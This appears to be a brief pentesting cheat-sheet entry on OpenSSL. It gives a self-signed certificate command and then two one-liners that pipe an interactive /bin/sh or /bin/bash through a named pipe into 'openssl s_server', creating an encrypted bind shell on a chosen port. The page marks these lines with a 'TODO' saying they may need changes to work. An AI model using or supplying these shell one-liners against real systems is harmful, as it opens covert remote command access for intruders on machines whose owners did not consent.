# OpenSSL

Generate TLS certificate

```
$ openssl req -x509 -newkey rsa:4096 -days 365 -nodes -subj "/C=<country_code>/ST=<state>/L=<locality>/O=<organization_name>/OU=<organization_unit>/CN=<domain.com>/emailAddress=<email>" -keyout private.key -out certificate.crt
```

Execute one-liner

TODO: Modify to ensure it works

```
$ mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | openssl s_server -quiet -key private.key -cert certificate.crt -port <PORT>; rm /tmp/f

$ mkfifo /tmp/f; /bin/bash -i < /tmp/f 2>&1 | openssl s_server -quiet -key private.key -cert certificate.crt -port <PORT>; rm /tmp/f
```